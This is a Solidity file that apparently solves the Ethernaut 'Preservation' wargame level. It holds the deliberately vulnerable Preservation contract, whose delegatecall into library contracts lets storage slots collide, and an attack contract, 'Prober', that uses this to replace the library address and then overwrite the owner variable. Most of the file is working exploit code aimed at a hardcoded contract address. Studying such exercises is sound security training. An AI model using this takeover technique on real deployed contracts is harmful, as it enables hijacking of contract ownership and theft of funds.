// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract Prober {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function attack() public {
        // Ethernaut contract to attack
        Preservation preservation = Preservation(0xF16a61861A41Eb4b8ba8E062727c21aC522e2cd1);

        // Put this attack contract in ethernaut storage
        preservation.setFirstTime(uint(uint160(address(this))));
        // Now call again when delegatecall redirects to address(this) and uses our custom setTime() below to update owner
        preservation.setFirstTime(uint(uint160(msg.sender)));
    }

    function attack2() public {
        Preservation preservation = Preservation(0xF16a61861A41Eb4b8ba8E062727c21aC522e2cd1);
        // Now call again when delegatecall redirects to address(this) and uses our custom setTime() below to update owner
        preservation.setFirstTime(uint(uint160(msg.sender)));
    }

    function setTime(uint _time) public {
        uint time = _time;
        timeZone1Library = address(this);
        timeZone2Library = address(this);
        owner = address(uint160(time));
        storedTime = time;
    }
}